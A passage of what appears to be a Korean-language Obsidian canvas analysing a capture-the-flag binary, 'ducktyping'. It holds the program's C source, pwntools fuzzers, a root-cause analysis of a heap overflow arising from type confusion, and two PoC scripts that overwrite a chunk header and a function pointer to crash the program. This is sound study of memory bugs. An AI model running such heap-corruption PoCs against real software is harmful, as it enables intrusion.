**_quackables, evolution_t *_evolutions, s64_t _duck) {\n    quackable_t *quackable = _quackables[_duck];\n    quackable_change_sound(quackable); // 여기서 터진듯\n    involution(_quackables, evolutions, _duck);\n}\n  \nvoid handle_evolution(quackable_t **_quackables, evolution_t *_evolutions, s64_t _duck) {\n    evoquackable_t *evoquackable = NULL;\n    switch (_duck) {\n    case 0:\n        evoquackable = (evoquackable_t*)evoduck_create((duck_t*)_quackables[0]);\n        break;\n    case 1:\n        evoquackable = (evoquackable_t*)evoperson_create((person_t*)_quackables[1]);\n        break;\n    case 2:\n        evoquackable = (evoquackable_t*)evoshell_create((shell_t*)_quackables[2]);\n        break;\n    }\n    _quackables[_duck] = (quackable_t*)evoquackable;\n    _evolutions[_duck] = 1;\n}\n  \nvoid handle_person_special(quackable_t **_quackables, evolution_t *_evolutions) {\n    if (_evolutions[1] == 1) {  \n        printf(\"[!] EVOPERSON can not use this menu. must be PERSON.\\n\");\n        return;\n    }\n    person_t *person = (person_t*)quackables[1];\n    person_complain(person);\n}\n  \nint main() {\n    setup_environment();\n  \n    evolutions[0] = 0;\n    evolutions[1] = 0;\n    evolutions[2] = 0;\n    quackables[0] = (quackable_t*)duck_create();\n    quackables[1] = (quackable_t*)person_create();\n    quackables[2] = (quackable_t*)shell_create();\n  \n    while (1) {\n        s64_t duck = select_duck(evolutions);\n        if (duck == 0) {\n            printf(\"[!] Nope!\\n\");\n            continue;\n        }\n        --duck;\n  \n        s64_t action = select_action();\n        switch (action) {\n        case 1:\n            handle_make_sound(quackables, evolutions, duck);\n            break;\n        case 2:\n            handle_change_sound(quackables, evolutions, duck);\n            break;\n        case 3:\n            handle_evolution(quackables, evolutions, duck);\n            break;\n        case 19:\n            if (duck == 1) {\n                handle_person_special(quackables, evolutions);\n            }\n            break;\n        default :\n            printf(\"[!] Nope!\");\n        }\n    }\n  \n    return 0;\n}\n```","x":-4892,"y":2600,"width":772,"height":3140},
		{"id":"8f9054f786ae77a6","type":"text","text":"![](https://i.imgur.com/Co2E414.png)","x":-2520,"y":3044,"width":1961,"height":164},
		{"id":"14a2f7068427e2bc","type":"text","text":"```python\nfrom pwn import *\nimport random\n\ncontext.log_level = 'debug'\n\nr_list = [b'1',b'2',b'3']\np_list = [b'1',b'2',b'3',b'19']\nnum_list = []\n\np = process(\"./ducktyping\")\n\nevop = 0\n\nwhile(True):\n\n    try:\n#        num1 = random.choice(r_list)\n        num1 = b'2'\n        num_list.append(num1)\n        p.sendlineafter(b\">\", num1)\n\n\n        if(num1 == b'2'):\n            num2 = random.choice(p_list)\n            if (num2 == b'3'):\n                evop = 1\n            elif(num2 == b'1' or num2 == b'2'):\n                evop = 0\n            else:\n                pass\n        else :        \n            num2 = random.choice(r_list)\n\n            \n        num_list.append(num2)\n        p.sendlineafter(b\">\", num2)\n\n        if(num1 != b'3' and num2 == b'2'):\n            st = b'a'*0x1f\n            p.sendlineafter(b\">\", st)\n        \n        if(evop != 1 and num2 == b'19'):\n            pst = b'p'*0x1f\n            p.sendlineafter(b\">\", pst)\n    except:\n        break        \n\nprint(num_list)\n```","x":-2520,"y":3660,"width":520,"height":1220},
		{"id":"fec704c701d18dad","type":"text","text":"![](https://i.imgur.com/0LJFgOX.png)","x":-2520,"y":3360,"width":1961,"height":240},
		{"id":"37d25bcc74bb2314","type":"text","text":"![](https://i.imgur.com/AbVhupZ.png)","x":-2520,"y":3208,"width":1961,"height":152},
		{"id":"3b809ce8cdcf3566","type":"text","text":"# normal fuzzer","x":-2520,"y":3600,"width":250,"height":60},
		{"id":"f38641f3f38abc40","type":"text","text":"```c\n# include \"duck/evoduck.h\"\n  \n# include <stdio.h>\n# include <malloc.h>\n# include <memory.h>\n# include <string.h>\n# include <unistd.h>\n  \n/* ------------------------------------------------------------------------- */\n  \nvoid impl(evoduck_quack)(evoduck_t *_this) {\n    printf(\" /$$$$$$$$ /$$    /$$  /$$$$$$  /$$$$$$$  /$$   /$$  /$$$$$$  /$$   /$$\\n\");\n    printf(\"| $$_____/| $$   | $$ /$$__  $$| $$__  $$| $$  | $$ /$$__  $$| $$  /$$/\\n\");\n    printf(\"| $$      | $$   | $$| $$  \\\\ $$| $$  \\\\ $$| $$  | $$| $$  \\\\__/| $$ /$$/ \\n\");\n    printf(\"| $$$$$   |  $$ / $$/| $$  | $$| $$  | $$| $$  | $$| $$      | $$$$$/  \\n\");\n    printf(\"| $$__/    \\\\  $$ $$/ | $$  | $$| $$  | $$| $$  | $$| $$      | $$  $$  \\n\");\n    printf(\"| $$        \\\\  $$$/  | $$  | $$| $$  | $$| $$  | $$| $$    $$| $$\\\\  $$ \\n\");\n    printf(\"| $$$$$$$$   \\\\  $/   |  $$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/| $$ \\\\  $$\\n\");\n    printf(\"|________/    \\\\_/     \\\\______/ |_______/  \\\\______/  \\\\______/ |__/  \\\\__/\\n\");\n    printf(\"%s\\n\", _this->sound);\n}\n  \nvoid impl(evoduck_change_sound)(evoduck_t *_this) {\n    memset(_this->sound, 0, EVODUCK_SOUND_LEN);\n    printf(\"[+] What do you want to change to?\\n\");\n    printf(\"> \");\n    read(0, _this->sound, EVODUCK_SOUND_LEN - 1);\n}\n  \nduck_t* impl(evoduck_get_original)(evoduck_t *_this) {\n    return (duck_t*)base(_this)->original;\n}\n  \nvoid impl(evoduck_dtor)(evoduck_t *_this) {\n    impl(evoquackable_dtor)((evoquackable_t*)_this);\n}\n  \n/* ------------------------------------------------------------------------- */\n  \n# define N_DTOR              0\n# define N_QUACK             1\n# define N_CHANGE_SOUND      2\n# define N_GET_ORIGINAL      3\n  \nvfunc_t evoduck_vftable[] = {\n    (vfunc_t)impl(evoduck_dtor),\n    (vfunc_t)impl(evoduck_quack),\n    (vfunc_t)impl(evoduck_change_sound),\n    (vfunc_t)impl(evoduck_get_original),\n};\n  \nevoduck_t* evoduck_create(duck_t *_original) {\n    evoduck_t *this = (evoduck_t*)malloc(sizeof(evoduck_t));\n    evoduck_ctor(this, _original);\n    return this;\n}\n  \nevoduck_t* evoduck_delete(evoduck_t *_this) {\n    evoduck_dtor(_this);\n    free((void*)_this);\n    return (evoduck_t*)0;\n}\n  \nvoid evoduck_ctor(evoduck_t *_this, duck_t *_original) {\n    evoquackable_ctor((evoquackable_t*)_this, (quackable_t*)_original);\n    object(_this)->vftable = evoduck_vftable;\n    memset(_this->sound, 0, EVODUCK_SOUND_LEN);\n    strncpy(_this->sound, EVODUCK_SOUND_DEF, strlen(EVODUCK_SOUND_DEF));\n}\n  \nvoid evoduck_dtor(evoduck_t *_this) {\n    vfunc(_this, impl(evoduck_dtor), N_DTOR)(_this);\n}\n  \nvoid evoduck_quack(evoduck_t *_this) {\n    vfunc(_this, impl(evoduck_quack), N_QUACK)(_this);\n}\n  \nvoid evoduck_change_sound(evoduck_t *_this) {\n    vfunc(_this, impl(evoduck_change_sound), N_CHANGE_SOUND)(_this);\n}\n  \nduck_t* evoduck_get_original(evoduck_t *_this) {\n    return vfunc(_this, impl(evoduck_get_original), N_GET_ORIGINAL)(_this);\n}\n```","x":-4826,"y":-898,"width":937,"height":1765},
		{"id":"0964febfe4ff262c","type":"text","text":"```c\n# include \"duck/evoshell.h\"\n  \n# include <stdio.h>\n# include <malloc.h>\n# include <memory.h>\n# include <string.h>\n# include <unistd.h>\n  \n/* ------------------------------------------------------------------------- */\n  \nvoid impl(evoshell_quack)(evoshell_t *_this) {\n    printf(\" /$$$$$$$$ /$$    /$$  /$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$ /$$       /$$      \\n\");\n    printf(\"| $$_____/| $$   | $$ /$$__  $$ /$$__  $$| $$  | $$| $$_____/| $$      | $$      \\n\");\n    printf(\"| $$      | $$   | $$| $$  \\\\ $$| $$  \\\\__/| $$  | $$| $$      | $$      | $$      \\n\");\n    printf(\"| $$$$$   |  $$ / $$/| $$  | $$|  $$$$$$ | $$$$$$$$| $$$$$   | $$      | $$      \\n\");\n    printf(\"| $$__/    \\\\  $$ $$/ | $$  | $$ \\\\____  $$| $$__  $$| $$__/   | $$      | $$      \\n\");\n    printf(\"| $$        \\\\  $$$/  | $$  | $$ /$$  \\\\ $$| $$  | $$| $$      | $$      | $$      \\n\");\n    printf(\"| $$$$$$$$   \\\\  $/   |  $$$$$$/|  $$$$$$/| $$  | $$| $$$$$$$$| $$$$$$$$| $$$$$$$$\\n\");\n    printf(\"|________/    \\\\_/     \\\\______/  \\\\______/ |__/  |__/|________/|________/|________/\\n\");\n    printf(\"Q.U.4.C.K. Q.U.4.C.K.\\n\");\n}\n  \nvoid impl(evoshell_change_sound)(evoshell_t *_this) {\n    printf(\"[+] I still can't change sound\\n\");\n}\n  \nshell_t* impl(evoshell_get_original)(evoshell_t *_this) {\n    return (shell_t*)base(_this)->original;\n}\n  \nvoid impl(evoshell_dtor)(evoshell_t *_this) {\n    impl(evoquackable_dtor)((evoquackable_t*)_this);\n}\n  \n/* ------------------------------------------------------------------------- */\n  \n# define N_DTOR              0\n# define N_QUACK             1\n# define N_CHANGE_SOUND      2\n# define N_GET_ORIGINAL      3\n  \nvfunc_t evoshell_vftable[] = {\n    (vfunc_t)impl(evoshell_dtor),\n    (vfunc_t)impl(evoshell_quack),\n    (vfunc_t)impl(evoshell_change_sound),\n    (vfunc_t)impl(evoshell_get_original),\n};\n  \nevoshell_t* evoshell_create(shell_t *_original) {\n    evoshell_t *this = (evoshell_t*)malloc(sizeof(evoshell_t));\n    evoshell_ctor(this, _original);\n    return this;\n}\n  \nevoshell_t* evoshell_delete(evoshell_t *_this) {\n    evoshell_dtor(_this);\n    free((void*)_this);\n    return (evoshell_t*)0;\n}\n  \nvoid evoshell_ctor(evoshell_t *_this, shell_t *_original) {\n    evoquackable_ctor((evoquackable_t*)_this, (quackable_t*)_original);\n    object(_this)->vftable = evoshell_vftable;\n}\n  \nvoid evoshell_dtor(evoshell_t *_this) {\n    vfunc(_this, impl(evoshell_dtor), N_DTOR)(_this);\n}\n  \nvoid evoshell_quack(evoshell_t *_this) {\n    vfunc(_this, impl(evoshell_quack), N_QUACK)(_this);\n}\n  \nvoid evoshell_change_sound(evoshell_t *_this) {\n    vfunc(_this, impl(evoshell_change_sound), N_CHANGE_SOUND)(_this);\n}\n  \nshell_t* evoshell_get_original(evoshell_t *_this) {\n    return vfunc(_this, impl(evoshell_get_original), N_GET_ORIGINAL)(_this);\n}\n```","x":-3849,"y":-898,"width":856,"height":1669},
		{"id":"0340e62a4a4d752b","type":"text","text":"```c\n# ifndef _EVOSHELL_H_\n# define _EVOSHELL_H_\n  \n# include \"duck/evoquackable.h\"\n# include \"duck/shell.h\"\n  \ntypedef struct evoshell {\n    define_base(evoquackable_t);\n} evoshell_t;\n  \nvoid evoshell_quack(evoshell_t *_this);\nvoid evoshell_change_sound(evoshell_t *_this);\nshell_t *evoshell_get_original(evoshell_t *_this);\n  \nevoshell_t* evoshell_create(shell_t *_original);\nevoshell_t* evoshell_delete(evoshell_t *_this);\n  \nvoid evoshell_ctor(evoshell_t *_this, shell_t *_original);\nvoid evoshell_dtor(evoshell_t *_this);\nvoid impl(evoshell_dtor)(evoshell_t *_this);\n  \n# endif\n```","x":-3794,"y":1128,"width":747,"height":520},
		{"id":"08f92b321448f448","type":"text","text":"## 어택 벡터 선정\n\n1. 아마 함수 포인터를 overwrite하여 segfault를 실행 시킬 수 있지 않을까. heap exploit이 필요할듯, malloc과 free를 반복적으로 해야 할 듯 하다.","x":-3800,"y":2570,"width":760,"height":230},
		{"id":"532d33a97fcb2d70","type":"text","text":"## 어택 서페이스\n\n![](https://i.imgur.com/CObc5J8.png)\n\n시작 시 1, 2, 3 을 입력할 수 있다.\n\n![](https://i.imgur.com/UNdjZa8.png)\n\n1을 입력시 다시 1, 2, 3 선택지가 나온다.\n\n![](https://i.imgur.com/7tCh87W.png)\n\n1을 입력시 문자열이 출력된다.\n\n![](https://i.imgur.com/I4xA5o1.png)\n\n2를 입력시 문자열 입력이 가능하다. 이 입력은 make sound에서 출력될 문자열에 쓰여진다.\n\n![](https://i.imgur.com/X39qnEC.png)\n\n3을 입력 시 DUCK 항목이 EVODUCK으로 바뀌었다.\n\n![](https://i.imgur.com/9YxyXY8.png)\n\nEVODUCK으로 들어갈 시 Make sound를 하면 다음과 같이 출력된다. 이후 다시 DUCK으로 바뀐다.\n\nPERSON과 SHELL도 동작은 거의 비슷하다.\n![](https://i.imgur.com/lOSv5St.png)\n\n하나 다른 점은 person에서 19를 택할 시 문자열을 입력할 수 있고 문자열 입력을 하면 person의 make sound는 내가 입력한 문자열이 출력이 된다.\n\nevoperson에서는 불가능하다.\n\n![](https://i.imgur.com/leu2Wr6.png)\n\n또한 SHELL에서는 Change sound가 불가능하다.\n\n![](https://i.imgur.com/hrFA3Ld.png)\n\nEVOSHELL에서도 마찬가지로 불가능하다.\n\n![](https://i.imgur.com/sgmPNyN.png)\n","x":-3800,"y":3030,"width":1120,"height":4130},
		{"id":"b47eb9346e8244ab","type":"text","text":"# crash : `[b'2', b'3', b'2', b'3', b'2', b'1', b'2', b'19', b'2', b'3', b'2', b'1']`","x":1100,"y":-799,"width":1200,"height":90},
		{"id":"11075692afb8722e","type":"text","text":"여기서 3,1 로 overwrite된 chunk에 접근하면 변조된 포인터에 접근을 하고 segmentation fault가 발생한다.\n\n![](https://i.imgur.com/IuljSfw.png)","x":3500,"y":2020,"width":1040,"height":1055},
		{"id":"28c9e456978ddec6","type":"text","text":"2,3 과 3,3 , 2,3 을 하면 heap chunk가 다음과 같이 된다.\n\n![](https://i.imgur.com/fDPzXgc.png)","x":1140,"y":2263,"width":1320,"height":569},
		{"id":"d321cd1cd99f957e","type":"text","text":"여기서 2,1 을 하면 가장 아래 chunk가 free 되며 이전에 보여주었던것과 마찬가지로 person이 evo_person_1 이 된다. \n여기서 2, 19 를 하면 3,3 으로 생긴 chunk를 overwrite 한다.\n\n![](https://i.imgur.com/liQkwI6.png)","x":2540,"y":2325,"width":860,"height":445},
		{"id":"9ba106e6f2257947","type":"text","text":"# crash: `[b'2', b'3', b'3', b'3', b'2', b'3', b'2', b'1', b'2', b'19', b'3', b'1']`","x":1740,"y":1692,"width":1130,"height":101},
		{"id":"3d584969f081ee9c","type":"text","text":"# 요약\n\n2,3 으로 heap chunk 생성, 3,3 으로 heap chunk 생성, 2,3 으로 heap chunk 생성, 2,1 로 evo_p_2 를 involution하면서 위에서 했던 것 처럼 evo_p_1 이 person이 된다. 2, 19를 하면 overwtie가 발생해서 3,3 으로 생성한 chunk를 overwrite한다. 3,3의 구조체는 바로 함수 포인터가 있는데 그 부분을 덮어쓰면 이후 3, 1을 통해 함수 포인터에 접근해서 segmentation fault가 발생한다.\n","x":1740,"y":1793,"width":620,"height":210},
		{"id":"d62524842d99fddc","type":"text","text":"# PoC\n\n```python\nfrom pwn import *\n\np = process(\"./ducktyping\")\n\npause()\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'3')\n \np.sendlineafter(b\">\", b'3')\np.sendlineafter(b\">\", b'3')\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'3')\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'1')\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'19')\np.sendlineafter(b\">\", b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\np.sendlineafter(b\">\", b'3')\np.sendlineafter(b\">\", b'1')\n\np.sendlineafter(b\">\", b'\\n')\n```","x":2870,"y":1363,"width":592,"height":640},
		{"id":"1dc8c9234c9fcc58","type":"text","text":"![](https://i.imgur.com/Lpk3kzE.png)","x":2020,"y":-290,"width":1304,"height":721},
		{"id":"526eaf122a3d1a25","type":"text","text":"다음과 같이 2번째 evo_person의 original이 1번째 evo_person이 된다.","x":2540,"y":431,"width":534,"height":63},
		{"id":"b7b7969d4f2f88a5","type":"text","text":"malloc으로 heap chunks 할당을 해주고 evoperson_ctor을 한다.\n```c\nevoperson_t* evoperson_create(person_t *_original) {\n    evoperson_t *this = (evoperson_t*)malloc(sizeof(evoperson_t));\n    evoperson_ctor(this, _original);\n    return this;\n}\n```\n","x":677,"y":180,"width":727,"height":240},
		{"id":"99d0a35a3c7e79f4","type":"text","text":"evouqackable_ctor를 실행한다.\n\n```c\nvoid evoperson_ctor(evoperson_t *_this, person_t *_original) {\n    evoquackable_ctor((evoquackable_t*)_this, (quackable_t*)_original);\n    object(_this)->vftable = evoperson_vftable;\n    memset(_this->sound, 0, EVOPERSON_SOUND_LEN);\n    strncpy(_this->sound, EVOPERSON_SOUND_DEF, strlen(EVOPERSON_SOUND_DEF));\n}\n```\n","x":677,"y":460,"width":727,"height":240},
		{"id":"f44be1244f4cf643","type":"text","text":"object의 vftable에 evoperson_vftable을 넣는다\nmemset을 해준다\nstrncpy를 해준다.","x":1500,"y":510,"width":460,"height":140},
		{"id":"e5b4b2ccb754772a","type":"text","text":"quackables에 새로 할당된 evoquakable을 넣는다\nevolutions에 1을 넣는다.","x":1500,"y":-20,"width":400,"height":90},
		{"id":"6ddb2d5b5f75802f","type":"text","text":"근데 여기서 evo_person create를 한 번 더할시 다음과 같이 된다,","x":2000,"y":-433,"width":508,"height":56},
		{"id":"73d452c15b68d34e","type":"text","text":"# 요약\n2 3, 2 3 을 하면 evo_p 가 2개 생김(evo_p1, evo_p2). 여기서 2, 1를 해서 invol 하면 evo_p2가 free되고 그냥 p가 evo_p1를 가리킴, 근데 알다시피 그냥 p 는 evo_p 보다 구조체 크기가 큼, 즉 overwrite 가능, 2 19 를 통해 evo_p2 chunk의 size 부분을 overwrite, 다시 2 3 을 하면 overwrite된 곳에 할당이 되고 다시 2 1 을 하면 해당 chunk가 free되는데 해당 chunk의 size와 prev_size는 이미 변조되었기에  double free or corruption이 발생한다.","x":1236,"y":-680,"width":928,"height":190},
		{"id":"961376afef34d003","type":"text","text":"# Root Cause","x":1154,"y":360,"width":250,"height":60},
		{"id":"dbfd3b1c24a44a56","type":"text","text":"# PoC\n\n```python\nfrom pwn import *\n\np = process(\"./ducktyping\")\n\n# pause()\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'3')\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'3')\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'1')\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'19')\np.sendlineafter(b\">\", b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'3')\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'1')\n\np.sendlineafter(b\">\", b'\\n')\n```","x":2300,"y":-1109,"width":709,"height":619},
		{"id":"673f9dbd940cce7c","type":"text","text":"![](https://i.imgur.com/JQsIJAY.png)","x":5320,"y":766,"width":1280,"height":494},
		{"id":"0fb871e24d58af81","type":"text","text":"2번째 evo_person의 주소로 evoquackable_get_original을 실행한다.\n```c\nvoid involution(quackable_t **_quackables, evolution_t *_evolutions, s64_t _duck) {\n    if (_evolutions[_duck] == 0) {\n        return;\n    }\n    evoquackable_t *evoquackable = (evoquackable_t*)_quackables[_duck];\n    quackable_t *quackable = evoquackable_get_original(evoquackable);\n    evoquackable_delete(evoquackable);\n    _quackables[_duck] = quackable;\n    _evolutions[_duck] = 0;\n}\n```\n","x":3440,"y":-374,"width":827,"height":340},
		{"id":"37b8a9a92a04308e","type":"text","text":"```c\nevoquackable_t* evoquackable_delete(evoquackable_t *_this) {\n    evoquackable_dtor(_this); // 의미없는 함수\n    free((void*)_this);\n    return (evoquackable_t*)0;\n}\n```\n\nevoquackable_dtor 에서는 아무일도 안일어난다.\n해당 chunk(evo_person_2)를 free한다.","x":4386,"y":-342,"width":638,"height":268},
		{"id":"b53d81a2b0290dfa","type":"text","text":"여기서 2,1 을 해서 evo_person을 involution 하면 다음과 같이 된다.","x":3586,"y":-433,"width":534,"height":59},
		{"id":"aa3229e734b67def","type":"text","text":"```c\n    _quackables[_duck] = quackable;\n    _evolutions[_duck] = 0;\n```\n그리고 quackable(evo_person_1)을 quackables에 넣고 evolutions을 0으로 set한다. 그러면 결과적으로 quackables에는 원래였다면 그냥 person이여야 하지만 evo_person_1을 가리키게 된다. 여기서 생기는 문제점은 그냥 person이 evo_person 보다 구조체가 커서 evo_person_1 에서 overwrite가 발생할 수 있다.","x":4560,"y":-63,"width":600,"height":249},
		{"id":"76058a63c5168079","type":"text","text":"![](https://i.imgur.com/3lUFHiV.png)","x":5335,"y":-354,"width":1250,"height":680},
		{"id":"6267ceec90bc2942","type":"text","text":"2 19 를 통해 person의 complain에 입력한다. 하지만 해당 부분은 실제로는 evo_person의 크기여서 두번째 evo_person에 overwrite가 된다. a \\* 0x20으로 채우면 다음과 같이 된다.","x":5660,"y":-474,"width":600,"height":120},
		{"id":"08631b2c940ef182","type":"text","text":"![](https://i.imgur.com/JmER8zL.png)","x":5581,"y":536,"width":758,"height":166},
		{"id":"74827dc6939e71a1","type":"text","text":"evo_peron_2의 prev_size와 size를 overwrite했다.\n여기서 2 3 을 해주면 해당 부분이 다시 evo_person으로 할당되고\n2 1 을 해주면 해당 부분이 다시 free가 된다. 여기서 free에서의 주소 검증으로 \n현재 addr + size 를 하였을 때 arena_addr를 넘어가면 corruption이 발생한다.","x":5660,"y":366,"width":600,"height":170},
		{"id":"1b6464cd07ffaf76","type":"text","text":"```c\nquackable_t* evoquackable_get_original(evoquackable_t *_this) {\n    return vfunc(_this, impl(evoquackable_get_original), N_GET_ORIGINAL)(_this);\n}\n```\n","x":3451,"y":6,"width":806,"height":140},
		{"id":"11f7c5c23262fec8","type":"text","text":"```python\nfrom pwn import *\nimport random\n\n# context.log_level = 'debug'\n\nnum_short = []\n\nwhile(True):\n    r_list = [b'2',b'3'] # 1은 필요없는거 같기도 함\n    p_list = [b'2',b'3',b'19']\n    num_list = []\n    \n    p = process(\"./ducktyping\")\n\n    evop = 0\n\n    while(True):\n\n        try:\n            num1 = random.choice(r_list)\n#            num1 = b'2'\n            num_list.append(num1)\n            p.sendlineafter(b\">\", num1)\n\n\n            if(num1 == b'2'):\n                num2 = random.choice(p_list)\n                if (num2 == b'3'):\n                    evop = 1\n                elif(num2 == b'1' or num2 == b'2'):\n                    evop = 0\n                else:\n                    pass\n            else :        \n                num2 = random.choice(r_list)\n\n                \n            num_list.append(num2)\n            p.sendlineafter(b\">\", num2)\n\n            if(num1 != b'3' and num2 == b'2'):\n                st = b'a'*0x1f\n                p.sendlineafter(b\">\", st)\n            \n            if(evop != 1 and num2 == b'19'):\n                pst = b'p'*0x1f\n                p.sendlineafter(b\">\", pst)\n        except:\n            break        \n    \n    if(len(num_short) == 0 or len(num_short) > len(num_list)):\n        num_short = num_list\n\n    print(num_short)\n    print(\"\\n\" * 10)\n```","x":0,"y":4322,"width":700,"height":1403},
		{"id":"6e5eb02ae24bdcc5","type":"text","text":"# 최적화(자동) + list에서 1 제거","x":0,"y":4262,"width":500,"height":60},
		{"id":"020f60b247b3f693","type":"text","text":"![](https://i.imgur.com/NKzN5ix.png)","x":703,"y":4462,"width":1614,"height":81},
		{"id":"2546534038d57501","type":"text","text":"수작업을 통해 완벽한 최적화 및 효율성을 위해 1 추가","x":2148,"y":4408,"width":476,"height":50},
		{"id":"61ff9da848dcdad2","type":"text","text":"# crash : `[b'2', b'3', b'2', b'3', b'2', b'1', b'2', b'19', b'2', b'3', b'2', b'1']`","x":2440,"y":4458,"width":1200,"height":90},
		{"id":"7247496ac9ee16f7","type":"text","text":"## evoperson의 구조체\n\nvftable : 8byte\nperson(original) 주소 : 8byte\n울음 소리 : 0x20bbyte","x":-400,"y":-320,"width":400,"height":294},
		{"id":"df8b5af8fb2ba2b8","type":"text","text":"```c\nquackable_t* impl(evoquackable_get_original)(evoquackable_t *_this) {\n    return _this->original;\n}\n```\n2번째 evo_person의 original인 1번째 evo_person의 주소를 가져온다.","x":3451,"y":186,"width":806,"height":154},
		{"id":"d5db349183053acd","type":"text","text":"```c\n# ifndef _TYPE_H_\n# define _TYPE_H_\n  \ntypedef char  s8_t;\ntypedef short s16_t;\ntypedef int   s32_t;\ntypedef long  s64_t;\n  \ntypedef unsigned char  u8_t;\ntypedef unsigned short u16_t;\ntypedef unsigned int   u32_t;\ntypedef unsigned long  u64_t;\n  \n# endif\n```","x":-680,"y":1189,"width":313,"height":351},
		{"id":"9e8d77dbb05db6ea","type":"text","text":"quackable_ctor을 실행한다. 해당 함수는 할당된 부분에 vftable 주소를 넣는다.\n그리고 object의 vftable에 해당 evoquackable_vftable을 넣고\n할당된 부분의 orginal에 기존에 있었던 original 즉 person의 주소를 넣는다.\n```c\nvoid evoquackable_ctor(evoquackable_t *_this, quackable_t *_original) {\n    quackable_ctor((quackable_t*)_this); // 할당된 부분에 vftable 주소넣기\n    object(_this)->vftable = evoquackable_vftable; // object의 vftable에 해당 quack 넣기\n    _this->original = _original; // 할당된 부분의 orginal에 original 넣기\n}\n```\n","x":677,"y":740,"width":727,"height":280},
		{"id":"bcae3d35289d0155","type":"text","text":"처음 evoperson_create를 한다. \n```c\nvoid handle_evolution(quackable_t **_quackables, evolution_t *_evolutions, s64_t _duck) {\n    evoquackable_t *evoquackable = NULL;\n    switch (_duck) {\n    case 0:\n        evoquackable = (evoquackable_t*)evoduck_create((duck_t*)_quackables[0]);\n        break;\n    case 1:\n        evoquackable = (evoquackable_t*)evoperson_create((person_t*)_quackables[1]);\n        break;\n    case 2:\n        evoquackable = (evoquackable_t*)evoshell_create((shell_t*)_quackables[2]);\n        break;\n    }\n    _quackables[_duck] = (quackable_t*)evoquackable;\n    _evolutions[_duck] = 1;\n}\n```\n","x":640,"y":-360,"width":800,"height":460},
		{"id":"1ffcff4fe3313c37","type":"text","text":"기본 evo_person create는 다음과 같다,","x":843,"y":-433,"width":337,"height":73},
		{"id":"dbc8fe5997ab7028","type":"text","text":"# `[b'2', b'3', b'3', b'3', b'2', b'3', b'2', b'1', b'2', b'19', b'3', b'1']`","x":-160,"y":2938,"width":1000,"height":82},
		{"id":"b63f3bed51d62731","type":"text","text":"이상한 점은 변조 된 후 person에서 그냥 2 2 는 evo_p 기준으로 적고 2 19 는 그냥 p 기준으로 적는다.","x":5,"y":-310,"width":335,"height":137},
		{"id":"b22a7d550cd5045c","type":"text","text":"자동인 만큼 완벽한 최적화가 이루어지지 않음, \n항목 1은 crash에 필요없는 것 같음.","x":500,"y":4246,"width":540,"height":76},
		{"id":"16e89d67f62cfda0","type":"text","text":"```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n\nlist_seg = [b'2', b'3', b'2', b'3', b'2', b'1', b'2', b'19', b'2', b'3', b'2', b'1']\n    \np = process(\"./ducktyping\")\n\nevo_p = 0\n\ntry:\n    for i in range(0, len(list_seg), 2):\n        \n        fir = list_seg[i]\n        sec = list_seg[i+1]\n\n        p.sendlineafter(b\">\", fir)\n        \n        \n        p.sendlineafter(b\">\", sec)\n        \n        if(sec == b'2' and fir != b'3'):\n            p.sendlineafter(b\">\", b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n        if(sec == b'3' and fir == b'2'):\n            evo_p = 1\n        if(sec == b'19' and evo_p != 1):\n            p.sendlineafter(b\">\", b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n        if(fir == b'2' and (sec == b'2' or sec == b'1')):\n            evo_p = 0\n    p.sendlineafter(b\">\", b'1')\nexcept:\n    print(\"This list is crash\")\n```","x":300,"y":5830,"width":601,"height":785},
		{"id":"e8af904e1bb2b643","type":"text","text":"해당 list가 crash인지 검증 (duck이 선택되지 않는다는 가정 하에)","x":300,"y":5780,"width":569,"height":50}
	],
	"edges":[
		{"id":"c333745aeafe95da","fromNode":"db12e951c6d4fed7","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"a4adb5fd063c6415","fromNode":"2748179a293b330e","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"701decc356226385","fromNode":"4bc8e7164fdbe72c","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"616ed97d77ec36d5","fromNode":"a31071b1ab37d14f","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"8e195e8e7006e032","fromNode":"01cdae7f32b164ac","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"8ee9b0633f3bc963","fromNode":"259ccd5df8aa103f","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"31588e19b34f2b1c","fromNode":"f8e56833c27ae0c6","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"5eaf8e12ea4aec95","fromNode":"826a2b71cbfeccd5","fromSide":"bottom","toNode":"ede5772628b98ff2","toSide":"top"},
		{"id":"84de86bf2a41829c","fromNode":"4bc8e7164fdbe72c","fromSide":"left","toNode":"db12e951c6d4fed7","toSide":"top"},
		{"id":"26f843ad36c6b1fe","fromNode":"259ccd5df8aa103f","fromSide":"left","toNode":"826a2b71cbfeccd5","toSide":"right"},
		{"id":"a99fd58d7bb17f09","fromNode":"259ccd5df8aa103f","fromSide":"right","toNode":"f8e56833c27ae0c6","toSide":"left"},
		{"id":"5563f5b06073518a","fromNode":"259ccd5df8aa103f","fromSide":"left","toNode":"01cdae7f32b164ac","toSide":"top"},
		{"id":"eb2ae2747a1210a0","fromNode":"8abf6f8845da0c81","fromSide":"bottom","toNode":"4bc8e7164fdbe72c","toSide":"top"},
